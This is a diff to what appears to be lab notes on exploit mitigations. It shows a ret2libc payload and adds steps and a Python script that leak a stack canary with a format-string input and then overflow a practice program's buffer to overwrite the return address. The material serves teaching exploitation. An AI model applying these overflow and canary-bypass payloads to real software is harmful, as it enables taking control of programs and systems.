@@ -31,10 +31,12 @@ Exploit Mitigations and Bypasses
 			gcc wisdom.c -g -o wisdom.out -fno-stack-protector -z execstack
 		
 		Generate a cyclic pattern of length 300
+			chmod +x ./pat_gen.py
 			./pat_gen.py 300
 		
 		Compute the offset of the pattern
-			./pat_ind.py [hexdigits]
+			chmod +x ./pat_ind.py
+			python ./pat_ind.py [hexdigits]
 		
 		Display functions in the program
 			gdb> info functions
@@ -104,5 +106,42 @@ Exploit Mitigations and Bypasses
 				args = r"\x20\x8a\x04\x08"
 				
 				print "A"*152 + addr_system_esc + addr_exit_esc + args
+		
+		Recompile wisdom.c with Stack Canaries
+			gcc wisdom.c -g -o wisdom-canary -fstack-protector -z execstack
+		
+		Print program input which will leak a canary when interpreted as a format string
+			python -c 'print "%x " * 40'
+		
+		Print escaped Stack Canary exploit code
+			Python file:
+				#!/usr/bin/python
+				import sys
+				
+				# Exploit Linux randomized null terminator canaries with 2 buffers
+				
+				def lp(s, n):
+					return "0"*(n-len(s))+s
+
+				def reverse_and_escape(hexstring):
+					return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])
+
+
+				''' Exploit parameters '''
+				canary_hex_little = sys.argv[1]
+				eip_offset_1 = 34*4
+				eip_offset_2 = 34*4
+				eip_hex_str = "804876c"
+
+
+				eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
+				canary_offset_1 = eip_offset_1 - 8
+				print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # skip the first null byte
+
+				canary_offset_2 = eip_offset_2 - 8
+				print "A"*canary_offset_2 # implicit "\x00" will be written
+		
+		Run the file:
+			python exploit_e4_canaryleak.py [canaryhex]
 ```
 
